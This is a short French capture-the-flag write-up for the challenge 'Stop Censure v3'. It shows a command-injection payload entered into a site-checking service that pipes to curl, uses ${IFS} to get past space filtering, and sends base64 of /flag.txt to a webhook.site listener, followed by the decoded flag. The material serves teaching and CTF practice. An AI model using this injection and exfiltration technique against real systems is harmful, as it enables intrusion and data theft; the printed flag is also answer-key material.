# Stop Censure v3

On a besoin d'un listener sur Internet pour récupérer le flag. Par exemple, on peut utiliser https://webhook.site/.

On peut maintenant faire une commande pour exfiltrer le flag :

```
$ nc localhost 1337
---------------------------------
~~ Ce site est-il légal ? (v3) ~~
---------------------------------
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr/|curl${IFS}https://webhook.site/be5f6e8a-90a5-4973-805c-049a147b6e49/`base64${IFS}/flag''.txt`
Succès ! Le site est légal et fonctionnel !
```

On regarde notre listener et on voit un GET sur l'URL `https://webhook.site/be5f6e8a-90a5-4973-805c-049a147b6e49/TkJDVEZ7SDNsbG9fZnIwbV90aDNfSW50M3JuM3R9Cg==` :

```
$ echo TkJDVEZ7SDNsbG9fZnIwbV90aDNfSW50M3JuM3R9Cg== | base64 -d
NBCTF{H3llo_fr0m_th3_Int3rn3t}
```